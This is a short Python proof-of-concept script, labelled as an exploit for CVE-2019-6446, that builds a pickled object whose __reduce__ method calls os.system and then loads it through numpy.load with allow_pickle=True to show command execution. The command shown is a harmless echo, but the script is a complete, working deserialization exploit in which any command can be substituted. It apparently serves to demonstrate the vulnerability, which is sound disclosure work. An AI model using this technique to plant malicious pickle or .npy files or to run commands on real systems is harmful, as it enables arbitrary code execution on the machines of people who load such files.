# CVE-2019-6446 exploit
import numpy
import io
import pickle
import os

class Test(object):
    def __init__(self):
        self.a = 1

    def __reduce__(self):        
        return (os.system,('echo System commmand executed',))
malicious_object = Test()

# Create npy file in memory from plain picke
npy_bytes = io.BytesIO(pickle.dumps(malicious_object))
# This line execute OS command `echo` embedded into numpy file
numpy.load(npy_bytes, allow_pickle=True)
